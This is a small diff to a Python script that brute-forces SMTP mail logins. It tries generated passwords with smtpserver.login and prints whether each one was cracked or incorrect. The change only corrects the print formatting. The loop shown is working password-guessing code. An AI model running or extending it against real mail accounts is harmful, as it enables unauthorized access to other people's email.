@@ -22,10 +22,10 @@ for n in range(6, 12+1):
                try:
                    smtpserver.login(user, symbols)
 
-                   print("[+] Password Cracked: %s") % symbols
+                   print("[+] Password Cracked: %s" % symbols)
                    break
                except smtplib.SMTPAuthenticationError:
-                   print("[!] Password Inccorect: %s") % symbols
+                   print("[!] Password Inccorect: %s" % symbols)
 
 
 
